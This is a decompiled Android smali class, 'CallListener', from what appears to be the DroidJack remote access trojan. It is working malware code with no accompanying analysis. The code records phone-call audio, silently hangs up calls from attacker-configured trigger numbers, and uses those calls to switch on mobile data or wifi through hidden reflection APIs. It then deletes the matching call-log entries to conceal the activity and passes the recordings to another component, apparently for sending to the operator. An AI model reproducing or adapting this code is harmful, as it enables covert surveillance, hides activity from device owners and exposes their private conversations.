.class public Lnet/droidjack/server/CallListener;
.super Landroid/content/BroadcastReceiver;


# static fields
.field protected static a:Z

.field protected static b:Z

.field private static c:Landroid/media/MediaRecorder;

.field private static j:Lnet/droidjack/server/e;


# instance fields
.field private d:Landroid/content/Context;

.field private e:Ljava/lang/String;

.field private f:Ljava/lang/String;

.field private g:Ljava/lang/String;

.field private h:Ljava/lang/String;

.field private i:Landroid/telephony/TelephonyManager;

.field private k:Ljava/io/File;

.field private l:Ljava/lang/String;

.field private m:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const/4 v0, 0x0

    sput-boolean v0, Lnet/droidjack/server/CallListener;->a:Z

    sput-boolean v0, Lnet/droidjack/server/CallListener;->b:Z

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method static synthetic a(Lnet/droidjack/server/CallListener;)Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lnet/droidjack/server/CallListener;->f:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic a(Lnet/droidjack/server/CallListener;Ljava/io/File;)V
    .locals 0

    iput-object p1, p0, Lnet/droidjack/server/CallListener;->k:Ljava/io/File;

    return-void
.end method

.method static synthetic a(Lnet/droidjack/server/CallListener;Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lnet/droidjack/server/CallListener;->h:Ljava/lang/String;

    return-void
.end method

.method private a(Z)V
    .locals 2

    iget-object v0, p0, Lnet/droidjack/server/CallListener;->d:Landroid/content/Context;

    const-string v1, "wifi"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/wifi/WifiManager;

    invoke-virtual {v0, p1}, Landroid/net/wifi/WifiManager;->setWifiEnabled(Z)Z

    return-void
.end method

.method static synthetic b(Lnet/droidjack/server/CallListener;)Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lnet/droidjack/server/CallListener;->e:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic b(Lnet/droidjack/server/CallListener;Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lnet/droidjack/server/CallListener;->e:Ljava/lang/String;

    return-void
.end method

.method private b(Z)V
    .locals 6

    :try_start_0
    iget-object v0, p0, Lnet/droidjack/server/CallListener;->d:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "connectivity"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/ConnectivityManager;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v1

    const-string v2, "mService"

    invoke-virtual {v1, v2}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;

    move-result-object v1

    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Ljava/lang/reflect/Field;->setAccessible(Z)V

    invoke-virtual {v1, v0}, Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v1

    const-string v2, "setMobileDataEnabled"

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Class;

    const/4 v4, 0x0

    sget-object v5, Ljava/lang/Boolean;->TYPE:Ljava/lang/Class;

    aput-object v5, v3, v4

    invoke-virtual {v1, v2, v3}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v1

    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Ljava/lang/reflect/Method;->setAccessible(Z)V

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    aput-object v4, v2, v3

    invoke-virtual {v1, v0, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    invoke-static {v0}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method static synthetic c(Lnet/droidjack/server/CallListener;)Landroid/content/Context;
    .locals 1

    iget-object v0, p0, Lnet/droidjack/server/CallListener;->d:Landroid/content/Context;

    return-object v0
.end method

.method static synthetic c(Lnet/droidjack/server/CallListener;Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lnet/droidjack/server/CallListener;->f:Ljava/lang/String;

    return-void
.end method

.method static synthetic d(Lnet/droidjack/server/CallListener;)Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lnet/droidjack/server/CallListener;->g:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic d(Lnet/droidjack/server/CallListener;Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lnet/droidjack/server/CallListener;->g:Ljava/lang/String;

    return-void
.end method

.method static synthetic e(Lnet/droidjack/server/CallListener;)Ljava/io/File;
    .locals 1

    iget-object v0, p0, Lnet/droidjack/server/CallListener;->k:Ljava/io/File;

    return-object v0
.end method


# virtual methods
.method protected a(Ljava/io/File;)V
    .locals 2

    :try_start_0
    new-instance v0, Landroid/media/MediaRecorder;

    invoke-direct {v0}, Landroid/media/MediaRecorder;-><init>()V

    sput-object v0, Lnet/droidjack/server/CallListener;->c:Landroid/media/MediaRecorder;

    sget-object v0, Lnet/droidjack/server/CallListener;->c:Landroid/media/MediaRecorder;

    const/4 v1, 0x4

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setAudioSource(I)V

    sget-object v0, Lnet/droidjack/server/CallListener;->c:Landroid/media/MediaRecorder;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setOutputFormat(I)V

    sget-object v0, Lnet/droidjack/server/CallListener;->c:Landroid/media/MediaRecorder;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setAudioEncoder(I)V

    sget-object v0, Lnet/droidjack/server/CallListener;->c:Landroid/media/MediaRecorder;

    invoke-virtual {p1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/lang/String;)V

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    invoke-virtual {p1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    :try_start_1
    sget-object v0, Lnet/droidjack/server/CallListener;->c:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->prepare()V
    :try_end_1
    .catch Ljava/lang/IllegalStateException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :goto_0
    :try_start_2
    sget-object v0, Lnet/droidjack/server/CallListener;->c:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->start()V

    const/4 v0, 0x1

    sput-boolean v0, Lnet/droidjack/server/CallListener;->a:Z

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v1, "Recording"

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    :goto_1
    return-void

    :catch_0
    move-exception v0

    sget-object v0, Lnet/droidjack/server/CallListener;->c:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->prepare()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_0

    :catch_1
    move-exception v0

    invoke-static {v0}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1
.end method

.method public a()Z
    .locals 10

    const/4 v1, 0x1

    const/4 v2, 0x0

    :try_start_0
    iget-object v0, p0, Lnet/droidjack/server/CallListener;->d:Landroid/content/Context;

    const-string v3, "phone"

    invoke-virtual {v0, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    move-result-object v3

    :try_start_1
    const-string v4, "getITelephony"

    const/4 v5, 0x0

    new-array v5, v5, [Ljava/lang/Class;

    invoke-virtual {v3, v4, v5}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
    :try_end_1
    .catch Ljava/lang/NoSuchMethodException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    move-result-object v3

    :goto_0
    const/4 v4, 0x1

    :try_start_2
    invoke-virtual {v3, v4}, Ljava/lang/reflect/Method;->setAccessible(Z)V

    const/4 v4, 0x0

    new-array v4, v4, [Ljava/lang/Object;

    invoke-virtual {v3, v0, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Class;->getDeclaredMethods()[Ljava/lang/reflect/Method;

    move-result-object v4

    array-length v5, v4

    move v0, v2

    :goto_1
    if-lt v0, v5, :cond_0

    move v0, v1

    :goto_2
    return v0

    :catch_0
    move-exception v4

    const-string v4, "getITelephonyMSim"

    const/4 v5, 0x0

    new-array v5, v5, [Ljava/lang/Class;

    invoke-virtual {v3, v4, v5}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v3

    goto :goto_0

    :cond_0
    aget-object v6, v4, v0

    invoke-virtual {v6}, Ljava/lang/reflect/Method;->getName()Ljava/lang/String;

    move-result-object v7

    const-string v8, "endCall"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    move-result v7

    if-eqz v7, :cond_1

    const/4 v7, 0x1

    :try_start_3
    new-array v7, v7, [Ljava/lang/Object;

    const/4 v8, 0x0

    const/4 v9, 0x1

    invoke-static {v9}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v9

    aput-object v9, v7, v8

    invoke-virtual {v6, v3, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_3
    .catch Ljava/lang/IllegalArgumentException; {:try_start_3 .. :try_end_3} :catch_1
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    :cond_1
    :goto_3
    add-int/lit8 v0, v0, 0x1

    goto :goto_1

    :catch_1
    move-exception v7

    const/4 v7, 0x0

    :try_start_4
    new-array v7, v7, [Ljava/lang/Object;

    invoke-virtual {v6, v3, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    goto :goto_3

    :catch_2
    move-exception v0

    invoke-static {v0}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    move v0, v2

    goto :goto_2
.end method

.method public b()V
    .locals 6

    :try_start_0
    iget-object v0, p0, Lnet/droidjack/server/CallListener;->d:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    sget-object v1, Landroid/provider/CallLog$Calls;->CONTENT_URI:Landroid/net/Uri;

    const/4 v2, 0x0

    const/4 v3, 0x0

    const/4 v4, 0x0

    const-string v5, "_id DESC"

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0

    invoke-interface {v0}, Landroid/database/Cursor;->moveToFirst()Z

    const-string v1, "number"

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    iget-object v2, p0, Lnet/droidjack/server/CallListener;->l:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_0

    iget-object v2, p0, Lnet/droidjack/server/CallListener;->m:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_1

    :cond_0
    iget-object v1, p0, Lnet/droidjack/server/CallListener;->d:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    sget-object v2, Landroid/provider/CallLog$Calls;->CONTENT_URI:Landroid/net/Uri;

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "_id = "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, "_id"

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getInt(I)I

    move-result v0

    invoke-static {v0}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const/4 v3, 0x0

    invoke-virtual {v1, v2, v0, v3}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_1
    :goto_0
    return-void

    :catch_0
    move-exception v0

    invoke-static {v0}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method protected c()V
    .locals 5

    :try_start_0
    sget-boolean v0, Lnet/droidjack/server/CallListener;->a:Z

    if-eqz v0, :cond_0

    sget-object v0, Lnet/droidjack/server/CallListener;->c:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->stop()V

    sget-object v0, Lnet/droidjack/server/CallListener;->c:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->release()V

    const/4 v0, 0x0

    sput-object v0, Lnet/droidjack/server/CallListener;->c:Landroid/media/MediaRecorder;

    :cond_0
    const/4 v0, 0x0

    sput-boolean v0, Lnet/droidjack/server/CallListener;->a:Z

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v1, "Stopped Recording"

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    iget-object v0, p0, Lnet/droidjack/server/CallListener;->k:Ljava/io/File;

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    if-eqz v0, :cond_1

    new-instance v0, Lnet/droidjack/server/g;

    iget-object v1, p0, Lnet/droidjack/server/CallListener;->d:Landroid/content/Context;

    invoke-direct {v0, v1}, Lnet/droidjack/server/g;-><init>(Landroid/content/Context;)V

    iget-object v1, p0, Lnet/droidjack/server/CallListener;->e:Ljava/lang/String;

    iget-object v2, p0, Lnet/droidjack/server/CallListener;->f:Ljava/lang/String;

    iget-object v3, p0, Lnet/droidjack/server/CallListener;->g:Ljava/lang/String;

    iget-object v4, p0, Lnet/droidjack/server/CallListener;->h:Ljava/lang/String;

    invoke-virtual {v0, v1, v2, v3, v4}, Lnet/droidjack/server/g;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_1
    :goto_0
    return-void

    :catch_0
    move-exception v0

    invoke-static {v0}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 5

    const/4 v4, 0x0

    iput-object p1, p0, Lnet/droidjack/server/CallListener;->d:Landroid/content/Context;

    invoke-static {}, Lnet/droidjack/server/ae;->a()V

    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v0

    const-string v1, "android.intent.action.PHONE_STATE"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_7

    new-instance v1, Lnet/droidjack/server/by;

    invoke-direct {v1, p1}, Lnet/droidjack/server/by;-><init>(Landroid/content/Context;)V

    const-string v0, "mobiledataphno"

    invoke-virtual {v1, v0}, Lnet/droidjack/server/by;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lnet/droidjack/server/CallListener;->l:Ljava/lang/String;

    const-string v0, "wifiphno"

    invoke-virtual {v1, v0}, Lnet/droidjack/server/by;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lnet/droidjack/server/CallListener;->m:Ljava/lang/String;

    iget-object v0, p0, Lnet/droidjack/server/CallListener;->l:Ljava/lang/String;

    const-string v2, ""

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    iget-object v0, p0, Lnet/droidjack/server/CallListener;->l:Ljava/lang/String;

    if-nez v0, :cond_1

    :cond_0
    :try_start_0
    const-string v0, "mobiledataphno"

    const-string v2, "000000000000000"

    invoke-virtual {v1, v0, v2}, Lnet/droidjack/server/by;->a(Ljava/lang/String;Ljava/lang/String;)V

    const-string v0, "mobiledataphno"

    invoke-virtual {v1, v0}, Lnet/droidjack/server/by;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lnet/droidjack/server/CallListener;->l:Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_1
    :goto_0
    iget-object v0, p0, Lnet/droidjack/server/CallListener;->m:Ljava/lang/String;

    const-string v2, ""

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_2

    iget-object v0, p0, Lnet/droidjack/server/CallListener;->m:Ljava/lang/String;

    if-nez v0, :cond_3

    :cond_2
    :try_start_1
    const-string v0, "wifiphno"

    const-string v2, "111111111111111"

    invoke-virtual {v1, v0, v2}, Lnet/droidjack/server/by;->a(Ljava/lang/String;Ljava/lang/String;)V

    const-string v0, "wifiphno"

    invoke-virtual {v1, v0}, Lnet/droidjack/server/by;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lnet/droidjack/server/CallListener;->m:Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :cond_3
    :goto_1
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v0

    const-string v1, "android.intent.action.PHONE_STATE"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_6

    const-string v0, "phone"

    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    iput-object v0, p0, Lnet/droidjack/server/CallListener;->i:Landroid/telephony/TelephonyManager;

    :try_start_2
    const-string v0, "incoming_number"

    invoke-virtual {p2, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "-"

    const-string v2, ""

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "+"

    const-string v2, ""

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "("

    const-string v2, ""

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    const-string v1, ")"

    const-string v2, ""

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    iget-object v1, p0, Lnet/droidjack/server/CallListener;->l:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_4

    iget-object v1, p0, Lnet/droidjack/server/CallListener;->m:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_6

    :cond_4
    iget-object v1, p0, Lnet/droidjack/server/CallListener;->l:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_8

    const/4 v0, 0x1

    invoke-direct {p0, v0}, Lnet/droidjack/server/CallListener;->b(Z)V

    :cond_5
    :goto_2
    invoke-virtual {p0}, Lnet/droidjack/server/CallListener;->a()Z

    new-instance v0, Lnet/droidjack/server/d;

    const/4 v1, 0x0

    invoke-direct {v0, p0, v1}, Lnet/droidjack/server/d;-><init>(Lnet/droidjack/server/CallListener;Landroid/os/Handler;)V

    invoke-virtual {p1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    sget-object v2, Landroid/provider/CallLog$Calls;->CONTENT_URI:Landroid/net/Uri;

    const/4 v3, 0x1

    invoke-virtual {v1, v2, v3, v0}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    :cond_6
    :goto_3
    sget-boolean v0, Lnet/droidjack/server/CallListener;->b:Z

    if-eqz v0, :cond_7

    sget-object v0, Lnet/droidjack/server/CallListener;->j:Lnet/droidjack/server/e;

    if-nez v0, :cond_7

    new-instance v0, Lnet/droidjack/server/e;

    invoke-direct {v0, p0, v4}, Lnet/droidjack/server/e;-><init>(Lnet/droidjack/server/CallListener;Lnet/droidjack/server/e;)V

    sput-object v0, Lnet/droidjack/server/CallListener;->j:Lnet/droidjack/server/e;

    iget-object v0, p0, Lnet/droidjack/server/CallListener;->i:Landroid/telephony/TelephonyManager;

    sget-object v1, Lnet/droidjack/server/CallListener;->j:Lnet/droidjack/server/e;

    const/16 v2, 0x20

    invoke-virtual {v0, v1, v2}, Landroid/telephony/TelephonyManager;->listen(Landroid/telephony/PhoneStateListener;I)V

    :cond_7
    return-void

    :catch_0
    move-exception v0

    invoke-static {v0}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    const-string v0, "000000000000000"

    iput-object v0, p0, Lnet/droidjack/server/CallListener;->l:Ljava/lang/String;

    goto/16 :goto_0

    :catch_1
    move-exception v0

    invoke-static {v0}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    const-string v0, "111111111111111"

    iput-object v0, p0, Lnet/droidjack/server/CallListener;->m:Ljava/lang/String;

    goto/16 :goto_1

    :cond_8
    :try_start_3
    iget-object v1, p0, Lnet/droidjack/server/CallListener;->m:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_5

    const/4 v0, 0x1

    invoke-direct {p0, v0}, Lnet/droidjack/server/CallListener;->a(Z)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    goto :goto_2

    :catch_2
    move-exception v0

    invoke-static {v0}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    goto :goto_3
.end method
